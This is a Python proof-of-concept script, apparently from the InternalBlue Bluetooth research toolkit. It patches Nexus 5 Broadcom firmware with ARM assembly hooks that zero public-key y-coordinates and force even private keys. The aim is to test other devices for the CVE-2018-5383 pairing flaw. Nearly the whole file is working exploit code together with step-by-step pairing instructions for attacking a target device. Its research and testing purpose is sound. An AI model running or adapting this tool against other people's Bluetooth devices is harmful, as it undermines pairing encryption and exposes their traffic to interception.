#!/usr/bin/env python2

# Dennis Mantz
from internalblue import Address
from internalblue.adbcore import ADBCore
from pwnlib.asm import asm

internalblue = ADBCore()
device_list = internalblue.device_list()
if len(device_list) == 0:
    internalblue.logger.warning("No ADB devices connected!")
    exit(-1)
internalblue.interface = device_list[0][1]  # just use the first device


PK_RECV_HOOK_ADDRESS = Address(0x2FED8)
PK_SEND_HOOK_ADDRESS = Address(0x030098)
GEN_PRIV_KEY_ADDRESS = Address(0x48eba)
HOOKS_LOCATION = 0xd7800
ASM_HOOKS = """
b pk_recv_hook
b pk_send_hook
b gen_priv_key

// overwrite y-coordinate of received PK point
pk_recv_hook:
    push {r0-r3,lr}
    strb.w  r0, [r4, 170]
    ldr r0, =0x205614
    mov r1, 6
    mov r2, 0
loop1:
    str r2, [r0]
    add r0, 4
    subs r1, 1
    bne  loop1
    pop {r0-r3,pc}

// overwrite y-coordinate of own PK point before sending it out
pk_send_hook:
    add r2, r0, 24
    mov r3, 0
    mov r1, 6
loop2:
    str r3, [r2]
    add r2, 4
    subs r1, 1
    bne  loop2
    b 0x2FFC4

// generate a priv key which is always even
gen_priv_key:
    push {r4,lr}
    mov r3, r0
    mov r4, r1
generate:
    mov r0, r3
    mov r1, r4
    bl 0x48E96  // generate new priv key
    ldr  r2, [r3]
    ands r2, 0x1
    bne generate
    pop  {r4,pc}
"""

# setup sockets
if not internalblue.connect():
    internalblue.logger.critical("No connection to target device.")
    exit(-1)

if internalblue.fw.FW_NAME != "BCM4335C0":
    internalblue.logger.info("This PoC was written for the BCM4345C0 chip (e.g. Nexus 5)")
    internalblue.logger.info("It does not work on other firmwares (wrong offsets).")
    exit(-1)

# Install hooks
code = asm(ASM_HOOKS, vma=HOOKS_LOCATION)
internalblue.logger.info("Writing hooks to 0x%x..." % HOOKS_LOCATION)
if not internalblue.writeMem(HOOKS_LOCATION, code):
    internalblue.logger.critical("Cannot write hooks at 0x%x" % HOOKS_LOCATION)
    exit(-1)

internalblue.logger.info("Installing hook patches...")
internalblue.logger.info("  - Hook public key receive path to replace y-coordinate with zero")
patch = asm("bl 0x%x" % HOOKS_LOCATION, vma=PK_RECV_HOOK_ADDRESS)
if not internalblue.patchRom(PK_RECV_HOOK_ADDRESS, patch):
    internalblue.logger.critical("Installing patch for PK_recv failed!")
    exit(-1)

internalblue.logger.info("  - Hook public key send path to replace y-coordinate with zero")
patch = asm("bl 0x%x" % (HOOKS_LOCATION+2), vma=PK_SEND_HOOK_ADDRESS)
if not internalblue.patchRom(PK_SEND_HOOK_ADDRESS, patch):
    internalblue.logger.critical("Installing patch for PK_send failed!")
    exit(-1)

internalblue.logger.info("  - Hook private key generation function to always produce even private key")
# replace function sub_48E96 (generate random privkey) with a function
# that generates an even privkey. needs 2 dword patches because of alignment:
# 00048EB8 20 A8       ADD     R0, SP, #0x100+var_80
# 00048EBA FF F7 EC FF BL      sub_48E96
# 00048EBE 25 98       LDR     R0, [SP,#0x100+var_6C]
patch = asm("bl 0x%x" % (HOOKS_LOCATION+4), vma=GEN_PRIV_KEY_ADDRESS)
if not internalblue.patchRom(GEN_PRIV_KEY_ADDRESS, patch):
    internalblue.logger.critical("Installing patch for GEN_PRIV_KEY failed!")
    exit(-1)

# Forcing the generation of a new keypair
internalblue.logger.info("Send HCI_Write_Simple_Pairing_Mode command to force generation of new key pair")


# Done
internalblue.logger.info("Done. The device is now ready.")
internalblue.logger.info("Steps to verify if another BT device is vulnerable to CVE-2018-5383:")
internalblue.logger.info(" 1. Start InternalBlue CLI for Nexus 5 and activate the LMP monitor.")
internalblue.logger.info(" 2. Pair the Nexus 5 with the other BT device.")
internalblue.logger.info(" 3. If pairing fails with message 'Incorrect PIN', repeat step 2.")
internalblue.logger.info("    If the other device is vulnerable, pairing succeeds with 50% probability.")
internalblue.logger.info("    If the other device is NOT vulnerable, pairing never succeeds.")
internalblue.logger.info(" 4. After pairing was successful, check the LMP capture and verify that")
internalblue.logger.info("    the Nexus 5 sent zero as y-coordinate in the 'encapsulated payload' packet")
